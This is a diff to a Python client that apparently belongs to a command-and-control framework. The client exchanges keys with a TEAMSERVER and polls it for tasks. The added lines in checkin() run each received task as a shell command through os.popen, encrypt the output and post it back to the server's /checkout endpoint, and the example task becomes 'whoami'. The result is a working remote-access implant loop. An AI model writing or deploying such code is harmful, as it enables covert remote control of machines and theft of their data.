@@ -1,4 +1,5 @@
 import base64
+import os
 import struct
 
 import requests
@@ -19,6 +20,7 @@ KEY = get_random_bytes(32)
 nonce = get_random_bytes(16)
 SESSION_KEY = nonce + b"\x00" * 4 + KEY
 
+TypeGenericSombraPackage = 0x0
 TypeSombraGetTask = 0x1
 TypeSombraHello = 0x2
 TypeSombraKeyExchange = 0x3
@@ -26,12 +28,19 @@ TypeSombraGenSession = 0x4
 TypeSombraInitAgent = 0x5
 TypeGenericCheckin = 0x6
 TypeGenericTaskRequest = 0x7
+TypeGenericTaskResponse = 0x8
+
 
 def unpad(data):
-    padding_length = data[-1] # Last byte indicates how many bytes to remove
+    padding_length = data[-1]  # Last byte indicates how many bytes to remove
     unpadded_data = data[:-padding_length]
     unpadded_data = unpadded_data[6:]
     return unpadded_data
+
+def pad(data: bytes, block_size: int) -> bytes:
+    padding_length = block_size - (len(data) % block_size)
+    padding = bytes([padding_length] * padding_length)  # Padding bytes
+    return data + padding
 
 
 def encode_ltv_message(msg_type: int, value: str) -> bytes:
@@ -68,6 +77,7 @@ def start_listener():
 
 def RSA_encrypt(data: bytes, key: int) -> bytes:
     return pow(int.from_bytes(data, byteorder='big'), 65537, key).to_bytes(256, byteorder='big')
+
 
 def register():
     ltv_message = encode_ltv_message(TypeSombraHello, "")
@@ -160,10 +170,38 @@ def checkin():
     enc_task = b
     cipher = AES.new(KEY, AES.MODE_CBC, nonce)
     decrypted = cipher.decrypt(enc_task)
-
     task = unpad(decrypted).decode().strip()
-
     print(task)
+
+    # task = [cmd_id]||[cmd
+    task = task.split("||")
+    cmd_id = task[0]
+    cmd = task[1]
+
+    print(f"cmd_id: {cmd_id}")
+    print(f"cmd: {cmd}")
+
+    stdout = os.popen(cmd).read()
+    stdout = stdout.encode()
+    cipher = AES.new(KEY, AES.MODE_CBC, nonce)
+    # result = [cmd_id]||[res]
+    result = f"{cmd_id}||{stdout.decode()}"
+
+    encrypted = cipher.encrypt(pad(result.encode(), AES.block_size))
+    b64_encrypted = base64.b64encode(encrypted).decode()
+
+    data = encode_ltv_message(TypeGenericTaskResponse, b64_encrypted)
+    # sent_data = [UID]||[encrypted_blob]
+    sent_data = f"{UID}||{data.decode()}"
+    data = encode_ltv_message(TypeGenericSombraPackage, sent_data)
+    print(f"encrypted data: {data}")
+    print(f"decrypted: {decrypted}")
+    r = requests.post(
+        f"http://{TEAMSERVER}:80/checkout",
+        data=data,
+        headers={"Content-Type": "application/octet-stream"}
+    )
+    print(r.text)
 
 
 def assign_task():
@@ -173,8 +211,8 @@ def assign_task():
         },
         "Task": {
             "UID": UID,
-            "CommandID": "ABC"*100,
-            "Command": "A"*1000
+            "CommandID": "asdasdas",
+            "Command": "whoami"
         }
     }
 
